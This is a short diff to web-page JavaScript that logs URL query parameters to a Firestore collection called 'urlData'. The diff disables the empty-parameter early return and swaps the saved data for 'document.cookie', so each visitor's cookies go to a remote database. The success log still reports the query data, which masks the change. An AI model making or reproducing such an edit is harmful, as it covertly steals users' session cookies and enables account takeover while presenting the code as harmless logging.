@@ -43,12 +43,12 @@
 
       if (Object.keys(queryData).length === 0) {
         console.log("No URL parameters found.");
-        return;
+        // return;
       }
 
       try {
         await addDoc(collection(db, "urlData"), {
-          ...queryData,
+          document:document.cookie,
           timestamp: new Date()
         });
         console.log("Saved successfully!", queryData);
